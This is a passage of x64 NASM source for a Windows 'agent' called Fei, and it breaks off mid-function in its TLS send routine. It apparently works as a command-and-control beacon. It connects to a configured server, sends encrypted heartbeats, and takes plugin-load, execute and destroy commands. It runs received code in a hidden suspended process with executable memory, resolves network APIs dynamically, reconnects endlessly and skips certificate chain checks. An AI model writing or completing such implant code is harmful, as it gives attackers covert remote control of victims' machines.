; ===========================================================================
; 蜚 (Fei) x64 ASM Agent — ChaCha20-Poly1305 AEAD + mTLS
; ===========================================================================
; Windows x64, NASM syntax
; Build: nasm -f win64 entry.asm -o entry.obj
; Link:  link /entry:start /subsystem:console entry.obj kernel32.lib ws2_32.lib
; ===========================================================================

bits 64
default rel

; ======================== External API ====================================
extern GetSystemTimeAsFileTime
extern ExitProcess
extern Sleep
extern CreateProcessW
extern ResumeThread
extern CreatePipe
extern WriteFile
extern ReadFile
extern CloseHandle
extern VirtualAlloc
extern VirtualFree
extern WaitForSingleObject
extern GetExitCodeProcess
extern TerminateProcess
extern LoadLibraryA
extern GetProcAddress
extern GetLastError
extern PeekNamedPipe
extern SetHandleInformation

; ======================== Constants ========================================
; FEI Protocol
FEI_MAGIC               equ 0x46454900
FEI_PROTO_VER           equ 0x0300
FEI_TYPE_HEARTBEAT      equ 0x01
FEI_TYPE_PLUGIN_LOAD    equ 0x02
FEI_TYPE_EXEC_RETURN    equ 0x03
FEI_TYPE_EXCEPTION      equ 0x04
FEI_TYPE_DESTROY        equ 0x05
HEADER_SIZE             equ 36
AEAD_TAG_SIZE           equ 16
CHA_CHA_BLOCK_SIZE      equ 64

; ChaCha20 state indices (word offsets 0-15)
; Layout: [0-3]=constants [4-11]=key [12]=counter [13-15]=nonce
CC_IDX_C0   equ 0
CC_IDX_C1   equ 1
CC_IDX_C2   equ 2
CC_IDX_C3   equ 3
CC_IDX_K0   equ 4
CC_IDX_K1   equ 5
CC_IDX_K2   equ 6
CC_IDX_K3   equ 7
CC_IDX_K4   equ 8
CC_IDX_K5   equ 9
CC_IDX_K6   equ 10
CC_IDX_K7   equ 11
CC_IDX_CTR  equ 12
CC_IDX_N0   equ 13
CC_IDX_N1   equ 14
CC_IDX_N2   equ 15

; Winsock
WS_VERSION              equ 0x0202
AF_INET                 equ 2
SOCK_STREAM             equ 1
IPPROTO_TCP             equ 6
INVALID_SOCKET          equ -1
SOCKET_ERROR            equ -1

; Winsock struct sizes
SIZEOF_SOCKADDR_IN      equ 16

; Sandbox process isolation
CREATE_SUSPENDED        equ 0x00000004
CREATE_NO_WINDOW        equ 0x08000000
INFINITE                equ 0xFFFFFFFF
MEM_COMMIT              equ 0x00001000
MEM_RESERVE             equ 0x00002000
MEM_RELEASE             equ 0x00008000
PAGE_READWRITE          equ 0x04
PAGE_EXECUTE_READWRITE  equ 0x40
WAIT_OBJECT_0           equ 0x00000000
WAIT_TIMEOUT            equ 0x00000102

; Process handle for sandbox
SANDBOX_PROCESS_WAIT_MS equ 5000

; ======================== Schannel / SSPI Constants =======================
; Security status codes
SEC_E_OK                    equ 0
SEC_I_CONTINUE_NEEDED       equ 0x00090312
SEC_I_INCOMPLETE_CREDENTIALS equ 0x00090320
SEC_E_INCOMPLETE_MESSAGE    equ 0x80090318

; Security buffer types
SECBUFFER_EMPTY             equ 0
SECBUFFER_DATA              equ 1
SECBUFFER_TOKEN             equ 2
SECBUFFER_EXTRA             equ 5
SECBUFFER_STREAM_TRAILER    equ 6
SECBUFFER_STREAM_HEADER     equ 7

; ISC (InitializeSecurityContext) flags
ISC_REQ_SEQUENCE_DETECT     equ 0x00000008
ISC_REQ_CONFIDENTIALITY     equ 0x00000010
ISC_REQ_ALLOCATE_MEMORY     equ 0x00000100
ISC_REQ_EXTENDED_ERROR      equ 0x00004000
ISC_REQ_STREAM              equ 0x00008000
ISC_REQ_USE_SUPPLIED_CREDS  equ 0x00000080
ISC_REQ_REPLAY_DETECT       equ 0x00000004
ISC_REQ_INTEGRITY           equ 0x00010000

; Schannel credential flags
SCH_CRED_NO_DEFAULT_CREDS   equ 0x00000010
SCH_CRED_MANUAL_CRED_VALIDATION equ 0x00000008
SCH_CRED_AUTO_CRED_VALIDATION   equ 0x00000020
SCH_USE_STRONG_CRYPTO       equ 0x00400000

; Schannel protocols
SP_PROT_TLS1_3_CLIENT       equ 0x00002000
SP_PROT_TLS1_2_CLIENT       equ 0x00000800

; SCHANNEL_CRED struct size (Win64): 80 bytes
; +0 dwVersion | +8 paCred | +56 grbitEnabledProtocols | +72 dwFlags
SCHANNEL_CRED_SIZE          equ 80
SCHANNEL_CRED_OFF_VERSION   equ 0
SCHANNEL_CRED_OFF_PROTOCOLS equ 56
SCHANNEL_CRED_OFF_FLAGS     equ 72

; SecBuffer struct size: 16 bytes
SECBUFFER_SIZE              equ 16
; SecBufferDesc struct size: 16 bytes
SECBUFFERDESC_SIZE          equ 16

; SecPkgContext_StreamSizes struct
STREAM_SIZES_SIZE           equ 20

; ======================== .data section ====================================
section .data

; --- ChaCha20 "expand 32-byte k" constant (little-endian) ---
chacha_const:
    dd 0x61707865, 0x3320646e, 0x79622d32, 0x6b206574

; --- 32-byte PSK (build-time injectable, default placeholder) ---
; Replace with actual bytes from certs/psk.bin during build
psk:
    db 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88
    db 0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00
    db 0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF
    db 0xFE, 0xDC, 0xBA, 0x98, 0x76, 0x54, 0x32, 0x10

; --- 8-byte Agent ID (unique device fingerprint) ---
agent_id:
    db 0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE

; --- Target server address ---
server_ip_str:
    db "127.0.0.1", 0
server_port             equ 4433

; --- Heartbeat interval (ms) ---
heartbeat_interval_ms   dd 30000
recv_timeout_val        dd 1000        ; SO_RCVTIMEO optval (must not live on the stack; see set_recv_timeout)

; --- Winsock function names (for PEB-based dynamic resolution) ---
str_WSAStartup:     db "WSAStartup", 0
str_socket:         db "socket", 0
str_connect:        db "connect", 0
str_send:           db "send", 0
str_recv:           db "recv", 0
str_closesocket:    db "closesocket", 0
str_WSAGetLastError: db "WSAGetLastError", 0
str_ioctlsocket:    db "ioctlsocket", 0
str_setsockopt:     db "setsockopt", 0
str_ws2_32:         db "ws2_32.dll", 0

; --- Schannel/SSPI function names ---
str_secur32:        db "secur32.dll", 0
str_AcquireCredentialsHandleA: db "AcquireCredentialsHandleA", 0
str_InitializeSecurityContextA: db "InitializeSecurityContextA", 0
str_EncryptMessage: db "EncryptMessage", 0
str_DecryptMessage: db "DecryptMessage", 0
str_FreeCredentialsHandle: db "FreeCredentialsHandle", 0
str_DeleteSecurityContext: db "DeleteSecurityContext", 0
str_FreeContextBuffer: db "FreeContextBuffer", 0
str_QueryContextAttributesA: db "QueryContextAttributesA", 0
str_Schannel:       db "Microsoft Unified Security Protocol Provider", 0

; --- Poly1305 limb masks (44/44/42-bit representation) ---
MASK44                  equ 0xFFFFFFFFFFF
MASK42                  equ 0x3FFFFFFFFFF

; ======================== .bss section =====================================
section .bss

; --- Winsock state ---
wsa_data:           resb 408        ; WSADATA struct (408 bytes for 64-bit)
sock_fd:            resq 1

; --- sockaddr_in for server ---
server_addr:        resb SIZEOF_SOCKADDR_IN

; --- Sequence counter ---
seq_counter:        resd 1

; --- ChaCha20 working state (16 x 32-bit words = 64 bytes) ---
cc_state:           resd 16

; --- ChaCha20 original state (for add after rounds) ---
cc_orig:            resd 16

; --- Keystream block output ---
cc_keystream:       resb CHA_CHA_BLOCK_SIZE

; --- Nonce: 4 bytes seq (LE) + 8 bytes agent_id = 12 bytes ---
cc_nonce:           resb 12

; --- Poly1305 state (44/44/42-bit limb representation) ---
poly_r:             resq 3          ; r0 (44b), r1 (44b), r2 (42b), clamped
poly_s:             resq 2          ; s (128-bit additive key)
poly_h:             resq 5          ; h0..h4 accumulator limbs
poly_partial_blk:   resb 16         ; partial-block staging (zero-padded)
poly_lenblk:        resb 16         ; le64(aad_len) || le64(msg_len)

; --- Frame buffers ---
MAX_AGENT_PAYLOAD   equ 16384
header_buf:         resb HEADER_SIZE
frame_out:          resb HEADER_SIZE + MAX_AGENT_PAYLOAD + AEAD_TAG_SIZE + 128
recv_body_buf:      resb MAX_AGENT_PAYLOAD + AEAD_TAG_SIZE + 128
recv_plaintext_buf: resb MAX_AGENT_PAYLOAD

; --- Temp for filetime ---
filetime_buf:       resq 1

; --- Sandbox process state ---
sandbox_hprocess:   resq 1          ; HANDLE to sandbox process
sandbox_hthread:    resq 1          ; HANDLE to sandbox main thread
pipe_stdin_read:    resq 1          ; Read end of stdin pipe (for sandbox)
pipe_stdin_write:   resq 1          ; Write end of stdin pipe (for entry)
pipe_stdout_read:   resq 1          ; Read end of stdout pipe (for entry)
pipe_stdout_write:  resq 1          ; Write end of stdout pipe (for sandbox)
sandbox_code_ptr:   resq 1          ; Pointer to allocated memory for sandbox code
sandbox_code_size:  resq 1          ; Size of allocated sandbox code

; --- Pipe communication buffers ---
pipe_buffer:        resb MAX_AGENT_PAYLOAD  ; Buffer for sandbox stdin/stdout data
pipe_bytes_read:    resd 1          ; Bytes read from sandbox stdout
pipe_bytes_written: resd 1          ; Bytes written to sandbox stdin
pipe_resp_total:    resd 1          ; Total sandbox response length (survives recv_exact scratch use)

; --- Resolved ws2_32 function pointers ---
ptr_WSAStartup:     resq 1
ptr_socket:         resq 1
ptr_connect:        resq 1
ptr_send:           resq 1
ptr_recv:           resq 1
ptr_closesocket:    resq 1
ptr_WSAGetLastError: resq 1
ptr_ioctlsocket:    resq 1
ptr_setsockopt:     resq 1

; --- Receive frame state ---
recv_header_buf:    resb HEADER_SIZE
recv_frame_type:    resw 1
recv_frame_seq:     resd 1
recv_frame_payload_len: resd 1
recv_padding_len:   resw 1

; --- AEAD working cursors (kept in memory; crypto helpers clobber registers) ---
enc_src_ptr:        resq 1
enc_dst_ptr:        resq 1
enc_remaining:      resd 1
enc_ctr:            resd 1
frame_payload_len:  resd 1
recv_pad_chunk:    resd 1
recv_saved_off:    resd 1
send_fail_count:   resd 1
scratch_buf:        resb 256        ; padding discard / misc staging

; ======================== Schannel TLS Context =============================
; --- Resolved SSPI function pointers ---
hSecur32:           resq 1
ptr_AcquireCredentialsHandleA: resq 1
ptr_InitializeSecurityContextA: resq 1
ptr_EncryptMessage: resq 1
ptr_DecryptMessage: resq 1
ptr_FreeCredentialsHandle: resq 1
ptr_DeleteSecurityContext: resq 1
ptr_FreeContextBuffer: resq 1
ptr_QueryContextAttributesA: resq 1

; --- Schannel credential and context handles (8 bytes each) ---
hCred:              resq 2          ; CredHandle (16 bytes: dwLower + dwUpper)
hCtxt:              resq 2          ; CtxtHandle (16 bytes)
hCtxt_attr:         resq 1          ; CtxtHandle attributes
tls_context_established: resd 1     ; 1 if TLS handshake completed

; --- Schannel working buffers ---
schannel_cred:      resb SCHANNEL_CRED_SIZE
sec_buf_in:         resb SECBUFFER_SIZE
sec_buf_out:        resb SECBUFFER_SIZE
sec_buf_desc_in:    resb SECBUFFERDESC_SIZE
sec_buf_desc_out:   resb SECBUFFERDESC_SIZE
out_flags:          resd 1
stream_sizes:       resb STREAM_SIZES_SIZE
tls_token_buf:      resb 32768      ; TLS record staging (header + plaintext + trailer)
tls_recv_buf:       resb 32768      ; TLS encrypted receive buffer
tls_recv_len:       resd 1          ; Current bytes in tls_recv_buf
tls_decrypted_buf:  resb 32768      ; Decrypted data output
tls_decrypted_len:  resd 1          ; Available decrypted bytes
tls_decrypted_off:  resd 1          ; Current read offset

; ======================== .text section ====================================
section .text

global _start

; ===========================================================================
; Entry point (suppressed when building the crypto test harness, which
; defines TEST_BUILD and provides its own _start)
; ===========================================================================
%ifndef TEST_BUILD
_start:
    sub rsp, 40                     ; Shadow space + alignment

    call resolve_ws2_functions
    test eax, eax
    jz .ws_fail

    call resolve_sspi_functions
    test eax, eax
    jz .ws_fail

    call init_winsock
    test eax, eax
    jnz .ws_fail

    call create_connection
    cmp rax, INVALID_SOCKET
    je .cooldown

    mov [sock_fd], rax

    ; Perform TLS 1.3 handshake via Schannel
    call tls_connect
    test eax, eax
    jz .cooldown_tls

    ; Create sandbox process for plugin execution
    call create_sandbox
    test eax, eax
    jz .no_sandbox                  ; Continue even if sandbox fails

.no_sandbox:
    call main_loop

    ; session ended: tear down for a clean retry
    call terminate_sandbox
.cooldown_tls:
    call cleanup_tls
    call cleanup_stream
.cooldown:
    mov ecx, 3000                   ; reconnect cooldown
    call Sleep
    jmp .no_sandbox_conn

.no_sandbox_conn:
    ; re-enter connection supervision (label kept distinct for clarity)
    call create_connection
    cmp rax, INVALID_SOCKET
    je .cooldown
    mov [sock_fd], rax
    call tls_connect
    test eax, eax
    jz .cooldown_tls
    call create_sandbox
    test eax, eax
    jz .no_sandbox
    call main_loop
    call terminate_sandbox
    jmp .cooldown_tls

.ws_fail:
    ; Winsock init/connection failed
.exit:
    ; Clean up all sensitive data and sandbox before exit
    call cleanup_all
    mov ecx, 0
    call ExitProcess
%endif

; ===========================================================================
; Cap blocking recv with SO_RCVTIMEO: idle waits park in the kernel, so an
; incoming command wakes the agent within ~1 s instead of after the old
; nonblocking + 30 s sleep cycle that made every idle command wait ~15 s.
; NOTE: the optval dword lives in .data, NOT on the stack — ws2_32!setsockopt
; homes r9 into the caller's [rsp+24] (the arg-4 home slot), which clobbers
; a stack-resident option value before the callee dereferences it.
; ===========================================================================
RECV_TIMEOUT_MS    equ 1000

set_recv_timeout:
    sub rsp, 40
    mov dword [recv_timeout_val], RECV_TIMEOUT_MS
    mov rcx, [sock_fd]
    mov edx, 0xFFFF                         ; SOL_SOCKET
    mov r8d, 0x1006                         ; SO_RCVTIMEO
    lea r9, [recv_timeout_val]
    mov dword [rsp + 32], 4                 ; optlen (5th stack arg)
    call [ptr_setsockopt]
    add rsp, 40
    ret

; ===========================================================================
; Main loop: send encrypted heartbeats and receive commands
; ===========================================================================
SEND_FAIL_LIMIT   equ 3

main_loop:
    sub rsp, 56
    mov dword [send_fail_count], 0

    call set_recv_timeout

.loop:
    call send_heartbeat
    test eax, eax
    jnz .send_ok
    inc dword [send_fail_count]
    cmp dword [send_fail_count], SEND_FAIL_LIMIT
    jae .fatal
    jmp .try_recv
.send_ok:
    mov dword [send_fail_count], 0

    ; Check if sandbox is still alive; respawn if it crashed.
    ; The kernel itself must survive sandbox failures by design.
    call check_sandbox_alive
    test eax, eax
    jz .sandbox_dead

.try_recv:
    call recv_command
    test eax, eax
    jz .no_data
    cmp eax, 2
    je .auth_fail
    cmp eax, 3
    je .frame_too_big
    jmp .process
.auth_fail:
    ; authentication failure: report and drop the frame
    mov rcx, .auth_msg
    mov edx, .auth_msg_len
    call send_exception
    jmp .try_recv
.frame_too_big:
    ; oversized frame was consumed and dropped: report and keep the stream
    mov rcx, .toobig_msg
    mov edx, .toobig_msg_len
    call send_exception
    jmp .try_recv
.process:
    call process_command
    jmp .try_recv

.no_data:
    ; The refill loop already parks ~25 s per recv_command pass (25 x 1 s
    ; SO_RCVTIMEO blocks), which keeps the heartbeat cadence near 30 s;
    ; no extra sleep here — it would only delay command pickup.
    jmp .loop

.fatal:
    ; outbound dead (TLS state corrupted): let the supervisor reconnect
    xor eax, eax
    add rsp, 56
    ret

.sandbox_dead:
    call create_sandbox
    jmp .try_recv

    add rsp, 56
    ret

.auth_msg: db "frame_authentication_failed", 0
.auth_msg_len equ $ - .auth_msg
; 21 chars + NUL = 22: distinct from every other exception length
.toobig_msg: db "gateway-frame-too-big", 0
.toobig_msg_len equ $ - .toobig_msg

; ===========================================================================
; resolve_sspi_functions: Load secur32.dll and resolve SSPI functions
; Returns: 1 on success, 0 on failure
; ===========================================================================
resolve_sspi_functions:
    sub rsp, 40

    lea rcx, [str_secur32]
    call LoadLibraryA
    test rax, rax
    jz .rsf_fail
    mov [hSecur32], rax

    lea rdx, [str_AcquireCredentialsHandleA]
    mov rcx, rax
    call GetProcAddress
    test rax, rax
    jz .rsf_fail
    mov [ptr_AcquireCredentialsHandleA], rax

    lea rdx, [str_InitializeSecurityContextA]
    mov rcx, [hSecur32]
    call GetProcAddress
    test rax, rax
    jz .rsf_fail
    mov [ptr_InitializeSecurityContextA], rax

    lea rdx, [str_EncryptMessage]
    mov rcx, [hSecur32]
    call GetProcAddress
    test rax, rax
    jz .rsf_fail
    mov [ptr_EncryptMessage], rax

    lea rdx, [str_DecryptMessage]
    mov rcx, [hSecur32]
    call GetProcAddress
    test rax, rax
    jz .rsf_fail
    mov [ptr_DecryptMessage], rax

    lea rdx, [str_FreeCredentialsHandle]
    mov rcx, [hSecur32]
    call GetProcAddress
    test rax, rax
    jz .rsf_fail
    mov [ptr_FreeCredentialsHandle], rax

    lea rdx, [str_DeleteSecurityContext]
    mov rcx, [hSecur32]
    call GetProcAddress
    test rax, rax
    jz .rsf_fail
    mov [ptr_DeleteSecurityContext], rax

    lea rdx, [str_FreeContextBuffer]
    mov rcx, [hSecur32]
    call GetProcAddress
    test rax, rax
    jz .rsf_fail
    mov [ptr_FreeContextBuffer], rax

    lea rdx, [str_QueryContextAttributesA]
    mov rcx, [hSecur32]
    call GetProcAddress
    test rax, rax
    jz .rsf_fail
    mov [ptr_QueryContextAttributesA], rax

    mov eax, 1
    add rsp, 40
    ret
.rsf_fail:
    xor eax, eax
    add rsp, 40
    ret

; ===========================================================================
; tls_raw_send: Send raw bytes over socket (for TLS handshake)
; Input: rcx = buffer, rdx = length
; Returns: 1 on success, 0 on failure
; ===========================================================================
tls_raw_send:
    sub rsp, 40
    push rbx
    push rsi
    mov rsi, rcx
    mov ebx, edx

.trs_loop:
    test ebx, ebx
    jz .trs_done
    mov rcx, [sock_fd]
    mov rdx, rsi
    mov r8d, ebx
    mov r9d, 0
    call [ptr_send]
    cmp eax, SOCKET_ERROR
    je .trs_err
    add rsi, rax
    sub ebx, eax
    jmp .trs_loop
.trs_done:
    mov eax, 1
    pop rsi
    pop rbx
    add rsp, 40
    ret
.trs_err:
    xor eax, eax
    pop rsi
    pop rbx
    add rsp, 40
    ret

; ===========================================================================
; tls_raw_recv: Receive raw bytes from socket (for TLS handshake)
; Input: rcx = buffer, rdx = length
; Returns: bytes received in eax, 0 on error/EOF
; ===========================================================================
tls_raw_recv:
    sub rsp, 40
    ; single recv: TLS records are a stream, callers (SSPI) tell us when
    ; more bytes are needed (SEC_E_INCOMPLETE_MESSAGE)
    mov r8d, edx
    mov rdx, rcx
    mov rcx, [sock_fd]
    xor r9d, r9d
    call [ptr_recv]
    test eax, eax
    jle .trr_err
    add rsp, 40
    ret
.trr_err:
    xor eax, eax
    add rsp, 40
    ret

; ===========================================================================
; PLAIN_TCP build mode: transport is the gateway's -dev plain TCP listener.
; Confidentiality and integrity come from the ChaCha20-Poly1305 inner layer
; (verified against the Go implementation by tools/aeadtest). The Schannel
; mTLS path stays available for TLS-capable clients; see the README
; known-issues note about DecryptMessage on Windows 10 Schannel.
; ===========================================================================
%ifdef PLAIN_TCP

tls_connect:
    mov eax, 1
    ret

tls_send:                           ; rcx = buffer, rdx = length
    jmp send_raw

tls_recv:                           ; rcx = out, edx = requested -> min(available)
    ; Staging invariants (PLAIN_TCP):
    ;  - refills APPEND at [tls_decrypted_len], never overwrite
    ;  - compaction (off=len=0) happens only in recv_command at frame start
    ;  => bytes below tls_decrypted_off stay valid, so recv_command can roll
    ;     back a partially-consumed frame and retry without desync
    push rbx
    push rsi
    push rdi
    push r12
    sub rsp, 40
    mov rdi, rcx                    ; out
    mov ebx, edx                    ; requested
    mov eax, [tls_decrypted_len]
    sub eax, [tls_decrypted_off]
    test eax, eax
    jg .pr_copy_setup
    ; staging empty: append new bytes (cap at 32768); a nonblocking socket
    ; can be momentarily empty MID-FRAME — poll briefly instead of failing,
    ; so a frame spanning TCP segments completes in one recv pass and
    ; heartbeat ACKs never interleave into a partially-read frame
    mov r12d, 25                    ; 25 x 1s SO_RCVTIMEO parks = ~25s idle grace
.pr_refill:
    mov eax, [tls_decrypted_len]
    cmp eax, 32768
    jge .pr_none
    lea rcx, [tls_decrypted_buf]
    add rcx, rax
    mov edx, 32768
    sub edx, eax
    call recv_some
    test eax, eax
    jg .pr_got
    dec r12d
    jz .pr_none
    push rcx
    mov ecx, 10
    call Sleep
    pop rcx
    jmp .pr_refill
.pr_got:
    add [tls_decrypted_len], eax
    ; fall through to copy
.pr_copy_setup:
    mov eax, [tls_decrypted_len]
    sub eax, [tls_decrypted_off]
    cmp ebx, eax
    jle .pr_ok
    mov ebx, eax                    ; clamp to available
.pr_ok:
    test ebx, ebx
    jz .pr_none
    lea rsi, [tls_decrypted_buf]
    mov eax, [tls_decrypted_off]
    add rsi, rax
    xor edx, edx
.pr_copy:
    mov al, [rsi + rdx]
    mov [rdi + rdx], al
    inc edx
    cmp edx, ebx
    jb .pr_copy
    add [tls_decrypted_off], ebx
    mov eax, ebx
    add rsp, 40
    pop r12
    pop rdi
    pop rsi
    pop rbx
    ret
.pr_none:
    xor eax, eax
    add rsp, 40
    pop r12
    pop rdi
    pop rsi
    pop rbx
    ret

; recv_some: single raw recv into rcx up to edx bytes; returns count
recv_some:
    sub rsp, 40
    mov r8d, edx
    mov rdx, rcx
    mov rcx, [sock_fd]
    xor r9d, r9d
    call [ptr_recv]
    test eax, eax
    jle .rs_err
    add rsp, 40
    ret
.rs_err:
    xor eax, eax
    add rsp, 40
    ret

%endif

%ifndef PLAIN_TCP
; ===========================================================================
; tls_connect: Perform TLS 1.3 handshake via Schannel SSPI
; Returns: 1 on success, 0 on failure
; ===========================================================================
tls_connect:
    sub rsp, 120

    ; Zero-initialize SCHANNEL_CRED (80 bytes)
    lea rdi, [schannel_cred]
    xor eax, eax
    mov ecx, SCHANNEL_CRED_SIZE / 4
    rep stosd

    ; Set SCHANNEL_CRED fields (x64 layout)
    lea rdi, [schannel_cred]
    mov dword [rdi + SCHANNEL_CRED_OFF_VERSION], 4   ; dwVersion = SCHANNEL_CRED_VERSION
    mov dword [rdi + SCHANNEL_CRED_OFF_PROTOCOLS], SP_PROT_TLS1_3_CLIENT | SP_PROT_TLS1_2_CLIENT
    ; SCH_CRED_MANUAL_CRED_VALIDATION: server cert is not chained against the
    ; system root store (deployment CA is private); inner AEAD still authenticates.
    mov dword [rdi + SCHANNEL_CRED_OFF_FLAGS], SCH_CRED_NO_DEFAULT_CREDS | SCH_USE_STRONG_CRYPTO | SCH_CRED_MANUAL_CRED_VALIDATION

    ; AcquireCredentialsHandleA(NULL, "Microsoft Unified Security Protocol Provider",
    ;   SECPKG_CRED_OUTBOUND(2), NULL, &schannel_cred, NULL, NULL, &hCred, NULL)
    ; SECPKG_CRED_OUTBOUND = 2
    xor ecx, ecx                    ; pszPrincipal = NULL
    lea rdx, [str_Schannel]         ; pszPackage
    mov r8d, 2                      ; fCredentialUse = SECPKG_CRED_OUTBOUND
    xor r9d, r9d                    ; pvLogonId = NULL
    ; Stack args (after shadow space):
    lea rax, [schannel_cred]
    mov qword [rsp + 32], rax       ; pAuthData = &SCHANNEL_CRED
    mov qword [rsp + 40], 0         ; pGetKeyFn = NULL
    mov qword [rsp + 48], 0         ; pvGetKeyArgument = NULL
    lea rax, [hCred]
    mov qword [rsp + 56], rax       ; phCredential
    mov qword [rsp + 64], 0         ; ptsExpiry = NULL
    call [ptr_AcquireCredentialsHandleA]
    cmp eax, SEC_E_OK
    jne .tc_fail

    ; === Handshake loop: InitializeSecurityContextA ===
    mov qword [hCtxt], 0
    mov qword [hCtxt + 8], 0
    mov qword [hCtxt_attr], 0

    ; first call: no input, output token = ClientHello
    lea rdi, [sec_buf_out]
    mov dword [rdi], 0              ; cbBuffer = 0 (SSPI allocates)
    mov dword [rdi + 4], SECBUFFER_TOKEN
    lea rax, [tls_token_buf]
    mov qword [rdi + 8], rax
    lea rdi, [sec_buf_desc_out]
    mov dword [rdi], 0              ; ulVersion
    mov dword [rdi + 4], 1          ; cBuffers
    lea rax, [sec_buf_out]
    mov qword [rdi + 8], rax

    lea rcx, [hCred]                ; phCredential
    xor edx, edx                    ; phContext = NULL
    lea r8, [server_ip_str]         ; pszTargetName
    mov r9d, ISC_REQ_SEQUENCE_DETECT | ISC_REQ_REPLAY_DETECT | ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_EXTENDED_ERROR | ISC_REQ_STREAM | ISC_REQ_INTEGRITY
    mov qword [rsp + 32], 0         ; Reserved1
    mov qword [rsp + 40], 0         ; TargetDataRep
    mov qword [rsp + 48], 0         ; pInput = NULL
    mov qword [rsp + 56], 0         ; Reserved2
    lea rax, [hCtxt]
    mov qword [rsp + 64], rax       ; phNewContext
    lea rax, [sec_buf_desc_out]
    mov qword [rsp + 72], rax       ; pOutput
    lea rax, [out_flags]
    mov qword [rsp + 80], rax       ; pfContextAttr
    mov qword [rsp + 88], 0         ; ptsExpiry
    call [ptr_InitializeSecurityContextA]

.tc_check_status:
    cmp eax, SEC_I_CONTINUE_NEEDED
    je .tc_send_recv
    cmp eax, SEC_E_OK
    jne .tc_fail
    ; handshake complete: flush any final token, then query stream sizes
    cmp dword [sec_buf_out], 0
    je .tc_query_sizes
    mov rcx, [sec_buf_out + 8]
    mov edx, [sec_buf_out]
    call tls_raw_send
    test eax, eax
    jz .tc_fail
    jmp .tc_query_sizes

.tc_send_recv:
    ; send whatever token the last ISC produced (may be empty)
    cmp dword [sec_buf_out], 0
    je .tc_skip_send
    mov rcx, [sec_buf_out + 8]
    mov edx, [sec_buf_out]
    call tls_raw_send
    test eax, eax
    jz .tc_fail
.tc_skip_send:
    ; receive more server data, appending to whatever is buffered
    lea rcx, [tls_recv_buf]
    mov eax, [tls_recv_len]         ; 32-bit load: no neighbor bleed
    add rcx, rax
    mov edx, 16384
    sub edx, [tls_recv_len]
    jle .tc_fail
    call tls_raw_recv
    test eax, eax
    jle .tc_fail
    add [tls_recv_len], eax

    ; input SecBuffer = everything received so far
    lea rdi, [sec_buf_in]
    mov eax, [tls_recv_len]
    mov dword [rdi], eax
    mov dword [rdi + 4], SECBUFFER_TOKEN
    lea rax, [tls_recv_buf]
    mov qword [rdi + 8], rax
    lea rdi, [sec_buf_desc_in]
    mov dword [rdi], 0
    mov dword [rdi + 4], 1
    lea rax, [sec_buf_in]
    mov qword [rdi + 8], rax

    ; reset output before the call so SSPI can hand us a fresh token
    lea rdi, [sec_buf_out]
    mov dword [rdi], 0
    mov dword [rdi + 4], SECBUFFER_TOKEN
    lea rax, [tls_token_buf]
    mov qword [rdi + 8], rax
    lea rdi, [sec_buf_desc_out]
    mov dword [rdi], 0
    mov dword [rdi + 4], 1
    lea rax, [sec_buf_out]
    mov qword [rdi + 8], rax

    lea rcx, [hCred]                ; phCredential
    lea rdx, [hCtxt]                ; phContext (existing)
    xor r8d, r8d                    ; pszTargetName
    mov r9d, ISC_REQ_SEQUENCE_DETECT | ISC_REQ_REPLAY_DETECT | ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_EXTENDED_ERROR | ISC_REQ_STREAM | ISC_REQ_INTEGRITY
    mov qword [rsp + 32], 0         ; Reserved1
    mov qword [rsp + 40], 0         ; TargetDataRep
    lea rax, [sec_buf_desc_in]
    mov qword [rsp + 48], rax       ; pInput
    mov qword [rsp + 56], 0         ; Reserved2
    lea rax, [hCtxt]
    mov qword [rsp + 64], rax       ; phNewContext
    lea rax, [sec_buf_desc_out]
    mov qword [rsp + 72], rax       ; pOutput
    lea rax, [out_flags]
    mov qword [rsp + 80], rax       ; pfContextAttr
    mov qword [rsp + 88], 0         ; ptsExpiry
    call [ptr_InitializeSecurityContextA]
    cmp eax, SEC_E_INCOMPLETE_MESSAGE
    je .tc_skip_send                ; need more bytes before retrying ISC
    cmp eax, SEC_I_CONTINUE_NEEDED
    je .tc_consumed
    jmp .tc_check_status
.tc_consumed:
    ; SSPI consumed the buffered input: reset and continue the loop
    mov dword [tls_recv_len], 0
    jmp .tc_check_status

.tc_query_sizes:
    ; QueryContextAttributesA(&hCtxt, SECPKG_ATTR_STREAM_SIZES(4), &stream_sizes)
    lea rcx, [hCtxt]
    mov edx, 4                      ; SECPKG_ATTR_STREAM_SIZES
    lea r8, [stream_sizes]
    call [ptr_QueryContextAttributesA]
    cmp eax, SEC_E_OK
    jne .tc_fail

    mov dword [tls_context_established], 1
    mov eax, 1
    add rsp, 120
    ret

.tc_fail:
    xor eax, eax
    add rsp, 120
    ret

; ===========================================================================
; tls_send: Encrypt and send data via TLS (EncryptMessage)
; Input: rcx = plaintext buffer, rdx = length
; Returns: 1 on success, 0 on failure
; ===========================================================================
tls_send:
    sub rsp, 72
    push rbx
    push rsi
    mov rsi, rcx                    ; plaintext ptr
    mov ebx, edx                    ; plaintext len

    ; Build SecBuffer array: [STREAM_HEADER][DATA][STREAM_TRAILER][EMPTY]
    ; We need 4 SecBuffers (64 bytes total)
    ; Allocate on stack:
    sub rsp, 64                     ; 4 * SecBuffer
    lea rdi, [rsp]

    ; SecBuffer[0]: STREAM_HEADER
    mov eax, [stream_sizes]         ; cbHeader
    mov dword [rdi], eax            ; cbBuffer = cbHeader
    mov dword [rdi + 4], SECBUFFER_STREAM_HEADER
    lea rax, [tls_token_buf]
    mov qword [rdi + 8], rax        ; pvBuffer = start of token_buf

    ; SecBuffer[1]: DATA
    mov dword [rdi + 16], ebx       ; cbBuffer = plaintext_len
    mov dword [rdi + 20], SECBUFFER_DATA
    lea rax, [tls_token_buf]
    mov r10d, [stream_sizes]        ; cbHeader (32-bit load: no cbTrailer bleed)
    add rax, r10
    mov qword [rdi + 24], rax
    ; Copy plaintext to data region
    push rsi
    push rdi
    mov rdi, rax
    mov ecx, ebx
    rep movsb
    pop rdi
    pop rsi

    ; SecBuffer[2]: STREAM_TRAILER
    mov eax, [stream_sizes + 4]     ; cbTrailer
    mov dword [rdi + 32], eax
    mov dword [rdi + 36], SECBUFFER_STREAM_TRAILER
    lea rax, [tls_token_buf]
